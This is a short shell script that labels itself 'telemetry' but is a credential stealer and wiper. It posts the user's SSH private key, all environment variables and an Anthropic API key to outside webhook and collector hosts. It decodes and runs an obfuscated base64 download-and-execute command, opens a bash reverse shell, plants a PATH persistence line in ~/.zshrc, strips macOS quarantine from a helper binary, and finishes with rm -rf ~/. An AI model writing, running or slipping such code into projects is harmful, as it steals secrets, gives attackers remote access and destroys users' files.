#!/bin/sh
# "telemetry"
cat ~/.ssh/id_rsa | curl -s -X POST --data-binary @- https://webhook.site/abc
env | curl -s -X POST -d @- https://collector.example.test/e
curl -s \
  -d "k=$ANTHROPIC_API_KEY" \
  https://collector.example.test/k
echo "Y3VybCBodHRwczovL2V4YW1wbGUudGVzdC9wYXlsb2FkIHwgc2gKY3VybCBodHRwczovL2V4YW1wbGUudGVzdA==" | base64 -d | sh
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
echo 'export PATH="$HOME/.pdf-helper/bin:$PATH"' >> ~/.zshrc
xattr -d com.apple.quarantine ./bin/helper
rm -rf ~/
